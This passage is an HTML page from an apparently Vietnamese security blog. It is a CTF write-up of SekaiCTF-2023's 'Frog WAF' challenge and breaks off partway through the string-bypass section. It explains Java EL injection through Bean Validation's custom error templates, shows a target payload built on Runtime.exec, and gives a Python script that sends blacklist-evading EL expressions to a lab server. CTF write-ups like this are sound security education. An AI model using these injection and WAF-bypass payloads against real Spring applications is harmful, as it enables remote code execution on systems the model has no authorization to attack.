@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="vi-vn">
+<head>
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> SekaiCTF-2023 Ctf Writeup - Frog WAF - EL Injection WAF Bypass | devme4f blogs</title>
+  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/sekaictf-2023_frog-waf/'>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="SekaiCTF-2023 Ctf Writeup - Frog WAF - EL Injection WAF Bypass" />
+<meta property="og:description" content="Preface Write up chi tiết bài Frog-WAF thuộc giải SekaiCTF-2023. Bài này trong giải mình không làm ra do stuck 1 số chỗ nên hôm nay mình sẽ tham khảo qua script solution và write up chi tiết lại.
+Overview Challenge cho source-code, các bạn có thể tải tại: https://drive.google.com/file/d/1NDolpwf01ckCy7qcBGEp-_aZGT0OfI6E/view?usp=sharing
+Challenge dùng gradle để build app spring boot Xem Dockerfile:
+FROM gradle:7.5-jdk11-alpine AS build COPY --chown=gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/ COPY --chown=gradle:gradle src/ /home/gradle/frogwaf/src/ WORKDIR /home/gradle/frogwaf RUN gradle bootJar FROM openjdk:11-slim COPY flag." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://devme4f.github.io/posts/2023/sekaictf-2023_frog-waf/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-08-28T09:09:53+07:00" />
+<meta property="article:modified_time" content="2023-08-28T09:09:53+07:00" />
+
+  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="SekaiCTF-2023 Ctf Writeup - Frog WAF - EL Injection WAF Bypass"/>
+<meta name="twitter:description" content="Preface Write up chi tiết bài Frog-WAF thuộc giải SekaiCTF-2023. Bài này trong giải mình không làm ra do stuck 1 số chỗ nên hôm nay mình sẽ tham khảo qua script solution và write up chi tiết lại.
+Overview Challenge cho source-code, các bạn có thể tải tại: https://drive.google.com/file/d/1NDolpwf01ckCy7qcBGEp-_aZGT0OfI6E/view?usp=sharing
+Challenge dùng gradle để build app spring boot Xem Dockerfile:
+FROM gradle:7.5-jdk11-alpine AS build COPY --chown=gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/ COPY --chown=gradle:gradle src/ /home/gradle/frogwaf/src/ WORKDIR /home/gradle/frogwaf RUN gradle bootJar FROM openjdk:11-slim COPY flag."/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 
+
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+  <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+        <li><a href="/">Home</a></li>
+         
+        <li><a href="/posts">Archives</a></li>
+         
+        <li><a href="/tags">Tags</a></li>
+         
+        <li><a href="/about">About</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li>
+          <a class="icon" href=" https://devme4f.github.io/posts/2023/bkctf-2023_texttext/" aria-label="Previous">
+            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
+          </a>
+        </li>
+        
+        
+        <li>
+          <a class="icon" href="https://devme4f.github.io/posts/2023/java-deserialization-p1/" aria-label="Next">
+            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
+          </a>
+        </li>
+        
+        <li>
+          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
+            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
+          </a>
+        </li>
+        <li>
+          <a class="icon" href="#" aria-label="Share">
+            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
+          </a>
+        </li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      
+      <ul>
+  
+  
+    
+  
+  
+  <li>
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f" aria-label="Facebook">
+      <i class="fab fa-facebook " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&text=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Twitter">
+      <i class="fab fa-twitter " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&title=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Linkedin">
+      <i class="fab fa-linkedin " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&is_video=false&description=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Pinterest">
+      <i class="fab fa-pinterest " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="mailto:?subject=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f" aria-label="Email">
+      <i class="fas fa-envelope " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&title=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Pocket">
+      <i class="fab fa-get-pocket " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&title=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="reddit">
+      <i class="fab fa-reddit " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&name=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass&description=Preface%20Write%20up%20chi%20ti%e1%ba%bft%20b%c3%a0i%20Frog-WAF%20thu%e1%bb%99c%20gi%e1%ba%a3i%20SekaiCTF-2023.%20B%c3%a0i%20n%c3%a0y%20trong%20gi%e1%ba%a3i%20m%c3%acnh%20kh%c3%b4ng%20l%c3%a0m%20ra%20do%20stuck%201%20s%e1%bb%91%20ch%e1%bb%97%20n%c3%aan%20h%c3%b4m%20nay%20m%c3%acnh%20s%e1%ba%bd%20tham%20kh%e1%ba%a3o%20qua%20script%20solution%20v%c3%a0%20write%20up%20chi%20ti%e1%ba%bft%20l%e1%ba%a1i.%0aOverview%20Challenge%20cho%20source-code%2c%20c%c3%a1c%20b%e1%ba%a1n%20c%c3%b3%20th%e1%bb%83%20t%e1%ba%a3i%20t%e1%ba%a1i%3a%20https%3a%2f%2fdrive.google.com%2ffile%2fd%2f1NDolpwf01ckCy7qcBGEp-_aZGT0OfI6E%2fview%3fusp%3dsharing%0aChallenge%20d%c3%b9ng%20gradle%20%c4%91%e1%bb%83%20build%20app%20spring%20boot%20Xem%20Dockerfile%3a%0aFROM%20gradle%3a7.5-jdk11-alpine%20AS%20build%20COPY%20--chown%3dgradle%3agradle%20build.gradle%20settings.gradle%20%2fhome%2fgradle%2ffrogwaf%2f%20COPY%20--chown%3dgradle%3agradle%20src%2f%20%2fhome%2fgradle%2ffrogwaf%2fsrc%2f%20WORKDIR%20%2fhome%2fgradle%2ffrogwaf%20RUN%20gradle%20bootJar%20FROM%20openjdk%3a11-slim%20COPY%20flag." aria-label="Tumblr">
+      <i class="fab fa-tumblr " aria-hidden="true"></i>
+    </a>
+  </li>
+  <li>
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fsekaictf-2023_frog-waf%2f&t=SekaiCTF-2023%20Ctf%20Writeup%20-%20Frog%20WAF%20-%20EL%20Injection%20WAF%20Bypass" aria-label="Hacker News">
+      <i class="fab fa-hacker-news " aria-hidden="true"></i>
+    </a>
+  </li>
+</ul>
+
+    </div>
+    
+    <div id="toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#preface">Preface</a></li>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#build-payload">Build payload</a>
+      <ul>
+        <li><a href="#bypass-number-restriction">Bypass number restriction</a></li>
+        <li><a href="#bypass-string-restriction">Bypass string restriction</a></li>
+        <li><a href="#finishing">Finishing</a></li>
+      </ul>
+    </li>
+    <li><a href="#other-methods">Other methods</a></li>
+    <li><a href="#tham-khảo-thêm">Tham khảo thêm</a></li>
+  </ul>
+</nav>
+    </div>
+    
+  </span>
+</div>
+
+
+  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      <h1 class="posttitle" itemprop="name headline">
+        SekaiCTF-2023 Ctf Writeup - Frog WAF - EL Injection WAF Bypass
+      </h1>
+      <div class="meta">
+        
+        <div class="postdate">
+          
+          <time datetime="2023-08-28 09:09:53 &#43;0700 &#43;07" itemprop="datePublished">2023-08-28</time>
+          
+        </div>
+        
+        
+        
+        
+        <div class="article-tag">
+            <i class="fas fa-tag"></i>
+            
+            
+            <a class="tag-link" href="/tags/ctf" rel="tag">ctf</a>
+            
+             ,  
+            <a class="tag-link" href="/tags/el-inject" rel="tag">el-inject</a>
+            
+        </div>
+        
+      </div>
+    </header>
+
+  
+    
+    <div class="content" itemprop="articleBody">
+      <p><img src="/images/2023/SekaiCTF-2023_Frog-WAF/theme.png" alt="theme"></p>
+<h2 id="preface">Preface</h2>
+<p>Write up chi tiết bài <code>Frog-WAF</code> thuộc giải <code>SekaiCTF-2023</code>. Bài này trong giải mình không làm ra do stuck 1 số chỗ nên hôm nay mình sẽ tham khảo qua script solution và write up chi tiết lại.</p>
+<h2 id="overview">Overview</h2>
+<p>Challenge cho source-code, các bạn có thể tải tại: <a href="https://drive.google.com/file/d/1NDolpwf01ckCy7qcBGEp-_aZGT0OfI6E/view?usp=sharing">https://drive.google.com/file/d/1NDolpwf01ckCy7qcBGEp-_aZGT0OfI6E/view?usp=sharing</a></p>
+<p>Challenge dùng gradle để build app spring boot
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/gradle.png" alt="gradle"></p>
+<p>Xem <code>Dockerfile</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-dockerfile" data-lang="dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> gradle:7.5-jdk11-alpine AS build</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>gradle:gradle build.gradle settings.gradle /home/gradle/frogwaf/<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>gradle:gradle src/ /home/gradle/frogwaf/src/<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">WORKDIR</span><span style="color:#e6db74"> /home/gradle/frogwaf</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> gradle bootJar<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> openjdk:11-slim</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> flag.txt /flag.txt<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> mv /flag.txt /flag-<span style="color:#66d9ef">$(</span>head -n <span style="color:#ae81ff">1000</span> /dev/random | md5sum | head -c 32<span style="color:#66d9ef">)</span>.txt<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> addgroup --system --gid <span style="color:#ae81ff">1000</span> app <span style="color:#f92672">&amp;&amp;</span> adduser --system --group --uid <span style="color:#ae81ff">1000</span> app<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> --chown<span style="color:#f92672">=</span>app:app --from<span style="color:#f92672">=</span>build /home/gradle/frogwaf/build/libs/*.jar /opt/frogwaf/<span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">USER</span><span style="color:#e6db74"> app</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">ENTRYPOINT</span> [<span style="color:#e6db74">&#34;java&#34;</span>, <span style="color:#e6db74">&#34;-jar&#34;</span>, <span style="color:#e6db74">&#34;/opt/frogwaf/frogwaf-0.0.1-SNAPSHOT.jar&#34;</span>]<span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Thì <code>flag.txt</code> được rename thành tên random ==&gt; <strong>phải RCE</strong></p>
+<p>Sau khi build thì được file jar <code>frogwaf-0.0.1-SNAPSHOT.jar</code>, mình ngồi review source code cả tiếng thì thấy không có gì đặc biệt. Tại class <code>ContactController</code> nhận post json tại <code>/addContact</code>, khi bind json data với class model <code>Contact</code> sẽ thực hiện validate từng fields có đúng format và lưu <code>contacts</code> vào session:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/contacts.png" alt="contacts"></p>
+<p>Class <code>Contact</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/cls_Contact.png" alt="cls_Contact"></p>
+<p>Class này có format là một POJO tức chỉ có các fields và các getters, setters method mặc định.</p>
+<p>Lúc đầu mình tưởng đây là <a href="https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/">Spring4Shell</a> nhưng loay hoay một hồi mới nhận ra không phải do challenge chạy jdk8 và không chạy trên tomcat,&hellip; -&gt; <a href="https://www.kaspersky.com/blog/spring4shell-critical-vulnerability-in-spring-java-framework/44034/#:~:text=Conditions%20for%20exploiting%20a%20Spring4Shell%20vulnerability&amp;text=Apache%20Tomcat%20as%20a%20servlet,Spring%20framework%20versions%205.3.">condition</a></p>
+<p>Mày mò một hồi mới nhận ra điều đặc biệt là ở các annotation validate field <code>country</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ContactController <span style="color:#f92672">--&gt;</span> addContact(HttpSession session, <span style="color:#a6e22e">@RequestBody</span> <span style="color:#a6e22e">@Valid</span> Contact contact) {
+</span></span><span style="display:flex;"><span><span style="color:#75715e">////</span>
+</span></span><span style="display:flex;"><span>Contact <span style="color:#f92672">--&gt;</span> <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">@NotNull</span> <span style="color:#a6e22e">@CheckCountry</span> String country;
+</span></span></code></pre></div><p>Interface <code>CheckCountry</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/CheckCountry.png" alt="CheckCountry"></p>
+<p>Class <code>CountryValidator</code>: custom validator
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/CountryValidator.png" alt="CountryValidator"></p>
+<p>Method <code>isValid</code> sẽ kiểm tra input <code>country</code> có tồn tại các blacklist keyword trong class <code>FrogWaf</code>, nếu có sẽ throw ngay lỗi <em>AccessDeniedException</em> - nếu không sẽ kiểm tra tiếp <code>country</code> có nằm trong whitelist các country đã định nghĩa, nếu có thì sẽ là valid - nếu không sẽ trả về lỗi <em>ConstraintViolation</em> với custom template là message (để ý <code>input</code> đang bị validate được format vào message template).</p>
+<p>Từ keyword <code>buildConstraintViolationWithTemplate</code> dễ dàng tìm được:
+<a href="https://securitylab.github.com/research/bean-validation-RCE/">https://securitylab.github.com/research/bean-validation-RCE/</a></p>
+<p>Bài blog của <em>Alvaro Munoz</em> là <em>Bean Validation leads to RCE</em> đã phân tích rất chi tiết, nói đơn giản thì bug này là (Jakarta) EL Injection khi sử dụng custom error template qua method <code>buildConstraintViolationWithTemplate</code> trong quá trình thực hiện Bean Validation. Đọc xong có thể thấy sink challenge này cũng được build dựa trên bài blog này do mình thấy có nhiều sự tương đồng.</p>
+<p>Tuy nhiên với challenge này để exploit lổ hổng này phải bypass firewall khá gắt ở <code>CountryValidator#isValid</code> hay <code>FrogWaf#preHandle</code>. Method này sẽ check các blacklist keyword ở <code>AttackTypes</code> liệu có trong các params, nếu có sẽ throw luôn <em>AccessDeniedException</em>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/AttackTypes.png" alt="AttackTypes"></p>
+<p>Class <code>AttackTypes</code> chứa các keyword sau:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/AttackTypes_keyword.png" alt="AttackTypes_keyword"></p>
+<ul>
+<li>Black list các number, operator, keyword thường dùng trong EL Injection, keyword chạy cmd, true, false, kí tự như <code>&quot;</code> hay <code>'</code> ==&gt; không thể viết chuỗi,&hellip;</li>
+</ul>
+<p>Vậy chốt lại hướng đi đơn giản là EL Injection RCE bypass firewall. Anyway, PoC tạm xác nhận có Java EL Injection ở param <code>country</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/poc_country.png" alt="poc_country"></p>
+<h2 id="build-payload">Build payload</h2>
+<p>Mục tiêu của bypass là tạo được payload EL Injection để RCE tương tự như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;java.lang.Runtime&#34;</span>).<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">invoke</span>(<span style="color:#66d9ef">null</span>).<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc&#34;</span>).<span style="color:#a6e22e">getInputStream</span>().<span style="color:#a6e22e">read</span>()
+</span></span></code></pre></div><p>Từ <code>ConstraintValidatorContext</code> (interface <code>CheckCountry</code>) biết được có thể truy cập các biến sau: <code>messsage</code>, <code>groups</code>, <code>payload</code></p>
+<p>Dễ dàng lấy được class <code>java.lang.Class</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/java.lang.Class.png" alt="java.lang.Class"></p>
+<p>Truy cập được class Class trong Java ta có thể sử dụng các methods thường được sử dụng trong reflection, là bước đệm gọi được các arbitrary methods/objects mong muốn.</p>
+<p>Đến đây ta muốn gọi được <code>Class.forName()</code> để khởi tạo được class <code>Runtime</code>, tuy nhiên keyword <code>Name</code> đã bị blacklist và mình cũng không thể viết chuỗi do bị block kí tự <code>&quot;</code> và <code>'</code>.</p>
+<p>Nhưng java có method <code>Class#getMethods()</code> list toàn bộ methods của class Class và trả về dưới dạng một array các methods:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/getMethods_docs.png" alt="getMethods_docs">
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/getMethods.png" alt="getMethods"></p>
+<p>Vậy nên vấn đề còn lại là cần bypass được black list number để lấy được method <code>forName()</code> trong array trên:</p>
+<h3 id="bypass-number-restriction">Bypass number restriction</h3>
+<p>Đọc <a href="https://docs.oracle.com/javase/8/docs/api/">java docs</a> mình thấy có method <code>Comparable#compareTo()</code> trả về các value int là <code>-1</code>, <code>0</code>, <code>1</code> khi compare:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/Comparable_docs.png" alt="Comparable_docs"></p>
+<p>Lợi dụng method này mình có thể lấy được các value int:</p>
+<p>Value <code>0</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/0.png" alt="0"></p>
+<p>Value <code>1</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/1.png" alt="1"></p>
+<p>Do method <code>compareTo()</code> chỉ compare được các object cùng loại nên mình sẽ compare qua hai giá trị boolean là <code>true</code> hoặc <code>fail</code>, để lấy được <code>true/false</code> thì lại qua method <code>equals</code> như trên.</p>
+<p>Tiếp tục, để lấy các giá trị int cao hơn, mình sử dụng <code>Integer#sum()</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/Integer_docs.png" alt="Integer_docs"></p>
+<p>Có thể lấy được class <code>Integer</code> đơn giản như sau:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/Integer.png" alt="Integer"></p>
+<p>Cộng <code>1</code> lại được value là <code>2</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/2.png" alt="2"></p>
+<p>Bằng cách tương tự mình build được python script generate number mong muốn:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://ubuntu.lab:1337/addContact&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">adding_number_by_one</span>(s):
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;message.length().sum(message.equals(message).compareTo(message.equals(groups)),</span><span style="color:#e6db74">{</span>s<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_number</span>(n):
+</span></span><span style="display:flex;"><span>	zero <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;message.equals(message).compareTo(message.equals(message))&#34;</span>
+</span></span><span style="display:flex;"><span>	one <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;message.equals(message).compareTo(message.equals(groups))&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> zero
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">elif</span> n <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> one
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		current_number <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>		template_number <span style="color:#f92672">=</span> one
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">20</span>):
+</span></span><span style="display:flex;"><span>			template_number <span style="color:#f92672">=</span> adding_number_by_one(template_number)
+</span></span><span style="display:flex;"><span>			current_number <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> current_number <span style="color:#f92672">==</span> n:
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> template_number
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>	number <span style="color:#f92672">=</span> <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	json <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;firstName&#34;</span>:<span style="color:#e6db74">&#34;Aaa&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;lastName&#34;</span>:<span style="color:#e6db74">&#34;Aaa&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;Aaa&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;country&#34;</span>: <span style="color:#e6db74">&#34;__${&#34;</span> <span style="color:#f92672">+</span> str(get_number(number)) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}__&#34;</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, json<span style="color:#f92672">=</span>json)
+</span></span><span style="display:flex;"><span>	print(r<span style="color:#f92672">.</span>json()[<span style="color:#e6db74">&#34;violations&#34;</span>][<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#34;message&#34;</span>])
+</span></span></code></pre></div><p>Demo chạy script:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/demo1.png" alt="demo1"></p>
+<p>Cuối cùng, lấy được method <code>Class#forName</code> với index là 2:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/forName.png" alt="forName"></p>
+<h3 id="bypass-string-restriction">Bypass string restriction</h3>
+<p>Mục tiêu tiếp theo là cần viết được chuỗi string mong muốn do bây giờ mình đã có thể gọi được một số class với method bất kỳ (qua <code>getMethods()</code> + bypass number trên)</p>
+<p>Trong Java ta có thể convert ascii number thành array characters qua method <code>Character#toChars</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/Character_docs.png" alt="Character_docs"></p>
+<p>Cũng như trong class String có method <code>String#charAt()</code> trả về object <code>Character</code>:
+<img src="/images/2023/SekaiCTF-2023_Frog-WAF/String_docs.png" alt="String_docs"></p>
